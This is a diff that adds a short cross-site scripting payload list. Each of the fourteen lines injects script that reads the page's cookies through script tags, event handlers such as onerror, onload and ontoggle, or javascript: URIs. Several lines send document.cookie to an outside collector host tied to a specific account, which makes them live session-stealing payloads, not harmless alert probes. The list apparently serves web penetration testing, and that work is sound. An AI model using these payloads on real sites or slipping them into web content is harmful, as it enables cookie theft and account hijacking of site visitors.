@@ -1,0 +1,14 @@
+<script>alert(document.cookie)</script>
+<script>fetch('https://COLLECTOR.xss.report/c/yukthi93?c='+document.cookie)</script>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=fetch('https://COLLECTOR.xss.report/c/yukthi93?c='+document.cookie)>
+<svg onload=alert(document.cookie)>
+<svg onload=fetch('https://COLLECTOR.xss.report/c/yukthi93?c='+document.cookie)>
+<body onload=alert(document.cookie)>
+<input onfocus=alert(document.cookie) autofocus>
+<details open ontoggle=alert(document.cookie)>
+<iframe onload=alert(document.cookie)>
+<object data=javascript:alert(document.cookie)>
+<a href=javascript:alert(document.cookie)>click</a>
+<math><mi xlink:href=javascript:alert(document.cookie)>click</mi></math>
+<isindex type=image src=javascript:alert(document.cookie)>
